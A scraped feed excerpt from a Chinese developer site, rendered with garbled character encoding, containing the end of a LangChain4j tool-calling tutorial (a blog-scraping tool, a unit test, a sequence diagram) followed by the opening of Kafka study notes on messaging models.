<h3 data-id="heading-6">æ­¥éª¤ 3ï¼šæŠŠå·¥å…·ç»‘å®šåˆ° AI Service</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> AiCodeHelperService <span class="hljs-title function_">aiCodeHelperService</span><span class="hljs-params">()</span> {
    <span class="hljs-type">ChatMemory</span> <span class="hljs-variable">chatMemory</span> <span class="hljs-operator">=</span> MessageWindowChatMemory.withMaxMessages(<span class="hljs-number">10</span>);

    <span class="hljs-keyword">return</span> AiServices.builder(AiCodeHelperService.class)
            .chatModel(qwenChatModel)
            .chatMemory(chatMemory)
            .contentRetriever(contentRetriever)
            .tools(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CnblogsArticleTool</span>())  <span class="hljs-comment">// â† ç»‘å®šå·¥å…·</span>
            .build();
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/499b163d84ed4c5e85be70841a8ec6e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=odp%2FgtNatrMahPCBvpHTq7Mtmz8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">æ­¥éª¤ 4ï¼šæµ‹è¯•ä¸€ä¸‹</h3>
<p>å†™ä¸ªå•å…ƒæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">chatWithTools</span><span class="hljs-params">()</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> aiCodeHelperService.chat(
        <span class="hljs-string">"å¸®æˆ‘æŸ¥ä¸‹åšå®¢å›­ç”¨æˆ· BNTang çš„æœ€æ–°æ–‡ç« "</span>
    );
    System.out.println(result);
}
</code></pre>
<p><strong>å…³é”®æ¥äº†</strong>ï¼Œåœ¨å·¥å…·æ–¹æ³•é‡Œæ‰“æ–­ç‚¹ï¼ŒDebug è¿è¡Œï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611e6c0594924a4c89ee6ae09d7561d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=lSuoawscE%2Fdapa5f0Mzp5sqtFx4%3D" alt="" loading="lazy"/></p>
<p><strong>ä½ ä¼šçœ‹åˆ°æ–­ç‚¹çœŸçš„åœä¸‹æ¥äº†ï¼</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0db05f55f0554c14a1696cea870ca029~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=by2Q5Hax0Nqmo%2BjseVCvMgzalmY%3D" alt="" loading="lazy"/></p>
<p>è¿™è¯´æ˜ <strong>AI çœŸçš„è°ƒç”¨äº†æˆ‘ä»¬çš„å·¥å…·</strong>ï¼</p>
<p>å·¥å…·æŠŠæ•°æ®è¿”å›ç»™ AI åï¼ŒAI ä¼šæ•´ç†æˆè‡ªç„¶è¯­è¨€ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cce64cd25ea34866a36b73a7cfe34272~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=RhIYv3Y4nx5FDfJ0%2F%2FXQDJeKVkI%3D" alt="" loading="lazy"/></p>
<p>åœ¨ Debug æ¨¡å¼ä¸‹ï¼Œä½ è¿˜èƒ½çœ‹åˆ° AI Service åŠ è½½äº†å·¥å…·ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f05ef6d9c21746b1a6d135fd4718c1d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=Qzkiw1asAAXRXe9uyV%2BaOSe0LeU%3D" alt="" loading="lazy"/></p>
<p>ä»¥åŠå·¥å…·çš„å®Œæ•´è°ƒç”¨é“¾è·¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75b9d16cb6fe4fc69e8efe49135871dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=1%2FNf3wsSa202z0IbwY%2F%2Frnw0KYk%3D" alt="" loading="lazy"/></p>
<p><strong>å®Œç¾è¿è¡Œï¼</strong></p>
<h2 data-id="heading-8">å·¥å…·å®šä¹‰çš„ä¸¤ç§æ–¹å¼</h2>
<p>å‰é¢ç”¨çš„æ˜¯å£°æ˜å¼å®šä¹‰ï¼ˆæ³¨è§£ï¼‰ï¼ŒLangChain4j ä¹Ÿæ”¯æŒç¼–ç¨‹å¼å®šä¹‰ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/061062b7cb694c1eacb33dcced29be88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=DbINAjyjC6kWH3f80FbL428%2FKPM%3D" alt="" loading="lazy"/></p>
<p><strong>ç®€å•åœºæ™¯ç”¨å£°æ˜å¼ï¼Œéœ€è¦åŠ¨æ€åˆ›å»ºå·¥å…·ç”¨ç¼–ç¨‹å¼ã€‚</strong></p>
<h2 data-id="heading-9">è¿˜èƒ½åšæ›´å¤š</h2>
<p>é™¤äº†æœç´¢ï¼Œå·¥å…·è°ƒç”¨è¿˜èƒ½å®ç°è¿™äº›åŠŸèƒ½ï¼š</p>
<ul>
<li>è¯»å†™æœ¬åœ°æ–‡ä»¶</li>
<li>ç”Ÿæˆ PDF æŠ¥å‘Š</li>
<li>æ‰§è¡Œ Shell å‘½ä»¤</li>
<li>ç”Ÿæˆå›¾è¡¨</li>
<li>è°ƒç”¨ä¼ä¸šå†…éƒ¨ API</li>
</ul>
<p><strong>æ›´æ£’çš„æ˜¯</strong>ï¼šè¿™äº›å·¥å…·ä¸ä¸€å®šéƒ½è¦è‡ªå·±å†™ï¼Œå¯ä»¥é€šè¿‡ MCPï¼ˆModel Context Protocolï¼‰åè®®ç›´æ¥ç”¨åˆ«äººå¼€å‘å¥½çš„å·¥å…·ã€‚</p>
<h2 data-id="heading-10">å®Œæ•´çš„è°ƒç”¨é“¾è·¯</h2>
<p>å¦‚æœæƒ³æ·±å…¥ç†è§£å·¥å…·è°ƒç”¨çš„æ¯ä¸€æ­¥ï¼Œçœ‹è¿™ä¸ªæ—¶åºå›¾å°±å¯¹äº†ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
      autonumber

      participant U2 as ğŸ§ª Test(ç”¨æˆ·)
      participant B1 as AiCodeHelperService
      participant L1 as LangChain4jæ¡†æ¶
      participant L2 as ChatModel(LLM)
      participant B3 as CnblogsArticleTool
      participant T1 as Jsoup(ç½‘é¡µæŠ“å–)

      Note over U2,T1: chatWithTools() æµ‹è¯•æµç¨‹

      U2-&gt;&gt;B1: chat("å¸®æˆ‘æŸ¥è¯¢åšå®¢å›­ç”¨æˆ· BNTang çš„æœ€æ–°æŠ€æœ¯æ–‡ç« ...")
      B1-&gt;&gt;L1: è½¬å‘è¯·æ±‚
      L1-&gt;&gt;L1: åŠ è½½ system-prompt.txt
      L1-&gt;&gt;L1: æ·»åŠ  ChatMemory(æœ€è¿‘10æ¡æ¶ˆæ¯)
      L1-&gt;&gt;L2: å‘é€ç”¨æˆ·æ¶ˆæ¯

      L2-&gt;&gt;L2: åˆ†ææ„å›¾
      L2-&gt;&gt;L2: è¯†åˆ«éœ€è¦è°ƒç”¨ cnblogsSearch å·¥å…·

      L2--&gt;&gt;L1: è¿”å›å·¥å…·è°ƒç”¨è¯·æ±‚
      L1-&gt;&gt;B3: searchCnblogsArticles("BNTang")

      B3-&gt;&gt;B3: è§£æè¾“å…¥å‚æ•°
      B3-&gt;&gt;B3: æ„é€ URL (https://www.cnblogs.com/BNTang/)

      B3-&gt;&gt;T1: fetchDocumentWithRetries(url, 3, 8000)
      T1-&gt;&gt;T1: å‘é€HTTPè¯·æ±‚
      T1--&gt;&gt;B3: è¿”å›HTMLæ–‡æ¡£

      B3-&gt;&gt;B3: è§£æHTML (.day å…ƒç´ )
      B3-&gt;&gt;B3: æå–æ–‡ç« ä¿¡æ¯(æ ‡é¢˜ã€é“¾æ¥ã€æ—¥æœŸã€æ‘˜è¦ç­‰)
      B3-&gt;&gt;B3: ç”ŸæˆJSONç»“æœ

      B3--&gt;&gt;L1: è¿”å›æ–‡ç« åˆ—è¡¨JSON
      L1-&gt;&gt;L2: å‘é€å·¥å…·ç»“æœç»™LLM

      L2-&gt;&gt;L2: åŸºäºå·¥å…·ç»“æœç”Ÿæˆæœ€ç»ˆå›å¤
      L2--&gt;&gt;L1: è¿”å›æœ€ç»ˆç­”æ¡ˆ
      L1--&gt;&gt;B1: è¿”å›ç»“æœ
      B1--&gt;&gt;U2: è¿”å› String ç»“æœ

      U2-&gt;&gt;U2: System.out.println(result)
</code></pre>
<p><strong>æ—¶åºå›¾è§£è¯»</strong>ï¼š</p>
<ol>
<li><strong>ç”¨æˆ·å‘èµ·è¯·æ±‚</strong>ï¼ˆæ­¥éª¤ 1-4ï¼‰ï¼šTest è°ƒç”¨ Serviceï¼ŒService è½¬å‘ç»™ LangChain4j æ¡†æ¶</li>
<li><strong>AI åˆ†ææ„å›¾</strong>ï¼ˆæ­¥éª¤ 5-7ï¼‰ï¼šLLM åˆ†æç”¨æˆ·é—®é¢˜ï¼Œå†³å®šéœ€è¦è°ƒç”¨ <code>cnblogsSearch</code> å·¥å…·</li>
<li><strong>å·¥å…·æ‰§è¡Œ</strong>ï¼ˆæ­¥éª¤ 8-17ï¼‰ï¼šTool ç”¨ Jsoup æŠ“å–åšå®¢å›­é¡µé¢ï¼Œè§£ææ•°æ®</li>
<li><strong>ç»“æœè¿”å›</strong>ï¼ˆæ­¥éª¤ 18-21ï¼‰ï¼šå·¥å…·ç»“æœè¿”å›ç»™ LLMï¼ŒLLM ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆ</li>
</ol>
<p><strong>å…³é”®ç‚¹</strong>ï¼šå·¥å…·æ‰§è¡Œåœ¨åº”ç”¨ä¾§ï¼ˆB3ã€T1ï¼‰ï¼Œä¸åœ¨ AI æœåŠ¡å™¨ï¼ˆL2ï¼‰ã€‚</p>
<h2 data-id="heading-11">å†™åœ¨æœ€å</h2>
<p>å·¥å…·è°ƒç”¨æ˜¯è®© AI çªç ´èƒ½åŠ›è¾¹ç•Œçš„å…³é”®æŠ€æœ¯ã€‚</p>
<p><strong>è®°ä½ä¸‰ä¸ªè¦ç‚¹</strong>ï¼š</p>
<ol>
<li>å·¥å…·æè¿°å†™æ¸…æ¥šï¼ŒAI æ‰èƒ½æ­£ç¡®è°ƒç”¨</li>
<li>å·¥å…·åœ¨åº”ç”¨ä¾§æ‰§è¡Œï¼Œä¸åœ¨ AI æœåŠ¡å™¨</li>
<li>å£°æ˜å¼å®šä¹‰ç®€å•ï¼Œç¼–ç¨‹å¼å®šä¹‰çµæ´»</li>
</ol>
<p>é€šè¿‡ LangChain4j çš„ <code>@Tool</code> æ³¨è§£ï¼Œåªéœ€è¦å‡ è¡Œä»£ç ï¼Œå°±èƒ½è®© AI æ‹¥æœ‰"è¶…èƒ½åŠ›"ã€‚</p>
<hr/>
<p><strong>ç³»åˆ—æ–‡ç« æŒç»­æ›´æ–°ä¸­ï¼Œå…³æ³¨æˆ‘ä¸é”™è¿‡æ¯ä¸€ç¯‡å¹²è´§ã€‚</strong></p>
<p><strong>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨çš„è¯ï¼Œç‚¹ä¸ªèµã€åœ¨çœ‹æ”¯æŒä¸€ä¸‹å§ï¼</strong></p>
<hr/>
<p><strong>ç›¸å…³æ–‡ç« æ¨è</strong>ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXhmFIeKpJR37AqqLg46b5w" target="_blank" title="https://mp.weixin.qq.com/s/XhmFIeKpJR37AqqLg46b5w" ref="nofollow noopener noreferrer">æ™ºè°± GLM-4.7 ç¼–ç¨‹ç¬¬ä¸€</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8fRzTXtAJ8_IfX2OggGDsw" target="_blank" title="https://mp.weixin.qq.com/s/8fRzTXtAJ8_IfX2OggGDsw" ref="nofollow noopener noreferrer">LangChain4j ç»“æ„åŒ–è¾“å‡ºå®æˆ˜</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FKtaNzGc3wbVKPwMTVl1z4g" target="_blank" title="https://mp.weixin.qq.com/s/KtaNzGc3wbVKPwMTVl1z4g" ref="nofollow noopener noreferrer">è®© AI ä¸å†å¤±å¿†</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FpnCbt98Ob4hb8sj9WPVV3g" target="_blank" title="https://mp.weixin.qq.com/s/pnCbt98Ob4hb8sj9WPVV3g" ref="nofollow noopener noreferrer">Claude Code å…è´¹æŒ‡å—</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kafkaå­¦ä¹ ç¬”è®°ç³»åˆ—â€”â€”å°è¯•ç‰›åˆ€]]></title>    <link>https://juejin.cn/post/7590654280898871339</link>    <guid>https://juejin.cn/post/7590654280898871339</guid>    <pubDate>2026-01-02T07:44:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590654280898871339" data-draft-id="7589942565011750938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kafkaå­¦ä¹ ç¬”è®°ç³»åˆ—â€”â€”å°è¯•ç‰›åˆ€"/> <meta itemprop="keywords" content="Kafka,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T07:44:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GoPilot"/> <meta itemprop="url" content="https://juejin.cn/user/4427068031123036"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kafkaå­¦ä¹ ç¬”è®°ç³»åˆ—â€”â€”å°è¯•ç‰›åˆ€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4427068031123036/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GoPilot
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:44:34.000Z" title="Fri Jan 02 2026 07:44:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">kafkaæ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>ä¸€å¥è¯æ¦‚æ‹¬ï¼šApache Kafka æ˜¯ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼æ¶ˆæ¯å¼•æ“ç³»ç»Ÿï¼Œä½¿ç”¨çº¯äºŒè¿›åˆ¶çš„å­—èŠ‚åºåˆ—æ¥ä¼ è¾“æ¶ˆæ¯ï¼Œæ”¯æŒç‚¹å¯¹ç‚¹æ¨¡å‹ï¼ˆå¦‚å®¢æœç”µè¯ï¼‰ã€å‘å¸ƒ/è®¢é˜…æ¨¡å‹ï¼ˆå¦‚æŠ¥çº¸è®¢é˜…ï¼‰ã€‚</p>
<pre><code class="hljs">   å¼•æ“ï¼šå…·å¤‡æŸç§èƒ½é‡è½¬æ¢ä¼ è¾“çš„èƒ½åŠ›ï¼› 
   æ¶ˆæ¯å¼•æ“ï¼šå°†ä¸Šæ¸¸çš„å·¨å¤§èƒ½åŠ›å¹³ç¨³çš„è¾“å‡ºåˆ°ä¸‹æ¸¸ 
   
   æ¶ˆæ¯ç³»ç»Ÿï¼šä¸æ˜¯å¾ˆæ°å½“ï¼Œå®ƒç‰‡é¢å¼ºè°ƒäº†æ¶ˆæ¯ä¸»ä½“çš„ä½œç”¨ï¼Œè€Œå¿½è§†äº†è¿™ç±»ç³»ç»Ÿå¼•ä»¥ä¸ºè±ªçš„æ¶ˆæ¯ä¼ é€’å±
</code></pre>
<p>æœ€åŸºç¡€çš„æ¶ˆæ¯å¼•æ“ï¼šç³»ç»Ÿ A å‘é€æ¶ˆæ¯ç»™æ¶ˆæ¯å¼•æ“ç³»ç»Ÿï¼Œç³»ç»Ÿ B ä»æ¶ˆæ¯å¼•æ“ç³»ç»Ÿä¸­è¯»å– A å‘é€çš„æ¶ˆæ¯ã€‚</p>
<p>æ—¢ç„¶æ¶ˆæ¯å¼•æ“æ˜¯ç”¨äºåœ¨ä¸åŒç³»ç»Ÿä¹‹é—´ä¼ è¾“æ¶ˆæ¯çš„ï¼Œé‚£ä¹ˆå¦‚ä½•è®¾è®¡å¾…ä¼ è¾“æ¶ˆæ¯çš„æ ¼å¼ä»æ¥éƒ½æ˜¯ä¸€ç­‰ä¸€çš„å¤§äº‹ã€‚è¯•é—®ä¸€æ¡æ¶ˆæ¯å¦‚ä½•åšåˆ°ä¿¡æ¯è¡¨è¾¾ä¸šåŠ¡è¯­ä¹‰è€Œæ— æ­§ä¹‰ï¼ŒåŒæ—¶å®ƒè¿˜è¦èƒ½æœ€å¤§é™åº¦åœ°æä¾›å¯é‡ç”¨æ€§ä»¥åŠé€šç”¨æ€§ï¼Ÿ</p>
<p>kafkaä¸­æ¶ˆæ¯è¿˜æ˜¯ç»“æ„åŒ–çš„ï¼Œåªæ˜¯åœ¨ä½¿ç”¨ä¹‹å‰éƒ½è¦å°†å…¶è½¬æ¢æˆäºŒè¿›åˆ¶çš„å­—èŠ‚åºåˆ—ã€‚</p>
<p>å¸¸è§çš„ä¸¤ç§æ¶ˆæ¯ä¼ è¾“æ–¹æ³•ï¼š</p>
<ol>
<li>ç‚¹å¯¹ç‚¹æ¨¡å‹ï¼šä¹Ÿå«æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å‹ã€‚ç³»ç»Ÿ A å‘é€çš„æ¶ˆæ¯åªèƒ½è¢«ç³»ç»Ÿ B æ¥æ”¶ï¼Œå…¶ä»–ä»»ä½•ç³»ç»Ÿéƒ½ä¸èƒ½è¯»å– A å‘é€çš„æ¶ˆæ¯ã€‚æ—¥å¸¸ç”Ÿæ´»çš„ä¾‹å­æ¯”å¦‚ç”µè¯å®¢æœå°±å±äºè¿™ç§æ¨¡å‹ï¼šåŒä¸€ä¸ªå®¢æˆ·å‘¼å…¥ç”µè¯åªèƒ½è¢«ä¸€ä½å®¢æœäººå‘˜å¤„ç†ï¼Œç¬¬äºŒä¸ªå®¢æœäººå‘˜ä¸èƒ½ä¸ºè¯¥å®¢æˆ·æœåŠ¡ã€‚</li>
<li>å‘å¸ƒ/è®¢é˜…æ¨¡å‹ï¼šæœ‰ä¸€ä¸ªä¸»é¢˜ï¼ˆTopicï¼‰çš„æ¦‚å¿µï¼Œä½ å¯ä»¥ç†è§£æˆé€»è¾‘è¯­ä¹‰ç›¸è¿‘çš„æ¶ˆæ¯å®¹å™¨ã€‚è¯¥æ¨¡å‹ä¹Ÿæœ‰å‘é€æ–¹å’Œæ¥æ”¶æ–¹ï¼Œå‘ä¸»é¢˜å‘å¸ƒæ¶ˆæ¯çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºç§°ä¸ºç”Ÿäº§è€…ï¼ˆProducerï¼‰ï¼Œç”Ÿäº§è€…ç¨‹åºé€šå¸¸æŒç»­ä¸æ–­åœ°å‘ä¸€ä¸ªæˆ–å¤šä¸ªä¸»é¢˜å‘é€æ¶ˆæ¯ï¼Œè€Œè®¢é˜…è¿™äº›ä¸»é¢˜æ¶ˆæ¯çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå°±è¢«ç§°ä¸ºæ¶ˆè´¹è€…ï¼ˆConsumerï¼‰ã€‚æ¶ˆè´¹è€…ä¹Ÿèƒ½å¤ŸåŒæ—¶è®¢é˜…å¤šä¸ªä¸»é¢˜çš„æ¶ˆæ¯ã€‚
å‘é€æ–¹ä¹Ÿç§°ä¸ºå‘å¸ƒè€…ï¼ˆPublisherï¼‰ï¼Œæ¥æ”¶æ–¹ç§°ä¸ºè®¢é˜…è€…ï¼ˆSubscriberï¼‰ã€‚å’Œç‚¹å¯¹ç‚¹æ¨¡å‹ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªæ¨¡å‹å¯èƒ½å­˜åœ¨å¤šä¸ªå‘å¸ƒè€…å‘ç›¸åŒçš„ä¸»é¢˜å‘é€æ¶ˆæ¯ï¼Œè€Œè®¢é˜…è€…ä¹Ÿå¯èƒ½å­˜åœ¨å¤šä¸ªï¼Œå®ƒä»¬éƒ½èƒ½æ¥æ”¶åˆ°ç›¸åŒä¸»é¢˜çš„æ¶ˆæ¯ã€‚ç”Ÿæ´»ä¸­çš„æŠ¥çº¸è®¢é˜…å°±æ˜¯ä¸€ç§å…¸å‹çš„å‘å¸ƒ / è®¢é˜…æ¨¡å‹ã€‚</li>
</ol>
<p>kafkaæ”¯æŒä¸Šè¿°ä¸¤ç§æ¨¡å‹ã€‚</p>
<p>æˆ‘ä»¬æŠŠç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ç»Ÿç§°ä¸ºå®¢æˆ·ç«¯ï¼ˆClientsï¼‰ã€‚å¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å®ä¾‹ï¼Œè¿™äº›å®ä¾‹ä¼šä¸æ–­åœ°å‘ Kafka é›†ç¾¤ä¸­çš„å¤šä¸ªä¸»é¢˜ç”Ÿäº§å’Œæ¶ˆè´¹æ¶ˆæ¯ã€‚</p>
<p>æœ‰å®¢æˆ·ç«¯è‡ªç„¶ä¹Ÿå°±æœ‰æœåŠ¡å™¨ç«¯ã€‚Kafka çš„æœåŠ¡å™¨ç«¯ç”±è¢«ç§°ä¸º Broker çš„æœåŠ¡è¿›ç¨‹æ„æˆï¼Œå³ä¸€ä¸ª Kafka é›†ç¾¤ç”±å¤šä¸ª Broker ç»„æˆï¼ŒBroker è´Ÿè´£æ¥æ”¶å’Œå¤„ç†å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚ï¼Œä»¥åŠå¯¹æ¶ˆæ¯è¿›è¡ŒæŒä¹…åŒ–ã€‚</p>
